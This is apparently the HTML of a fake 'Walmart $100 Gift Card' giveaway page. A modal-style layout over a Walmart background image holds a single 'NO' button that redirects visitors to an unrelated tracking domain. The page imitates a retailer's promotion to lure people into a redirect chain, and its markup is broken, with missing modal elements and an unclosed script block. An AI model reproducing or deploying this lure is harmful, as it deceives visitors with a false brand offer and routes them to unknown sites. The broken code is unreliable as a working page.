<!DOCTYPE html>
<html lang="en">
<head>
    
    <meta charset="UTF-8">

    <title>Walmart $100 Gift Card</title>
    <link rel="icon" type="image/png" href="favicon for content.png">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            font-family: Arial, sans-serif;
        }
        .background-image {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('Walmart-JPG1.jpg') no-repeat center center;
            background-size: cover;
            z-index: -1;
        }
        .modal {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
            width: 90%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
        }
        .modal h1 {
            font-size: 24px;
            margin: 0 0 20px;
        }
        .button-group {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
        }
        .button-group button {
            width: 48%;
            padding: 10px 0;
            border: none;
            font-size: 18px;
            font-weight: bold;
            color: white;
            border-radius: 5px;
            cursor: pointer;
        }
        .button-group .btn-male {
            background-color: #f9a825;
        }
        .button-group .btn-female {
            background-color: #f57c00;
        }
        .button-group .btn-male:hover {
            background-color: #f57f17;
        }
        .button-group .btn-female:hover {
            background-color: #e65100;
        }
        footer {
            position: fixed;
            bottom: 10px;
            width: 100%;
            text-align: center;
            color: #fff;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="background-image"></div>

            <button class="btn-male" onclick="window.location.href='https://zireemilsoude.net/4/8538454';">NO</button>

        </div>

    </div>
    <footer>
        <p>Privacy Policy | Cookie Policy | Terms of Agreement</p>
        <p>&copy; Copyright 2024</p>
    </footer>
    <script type="text/javascript">
        window.onload = () => {

</body>
</html>
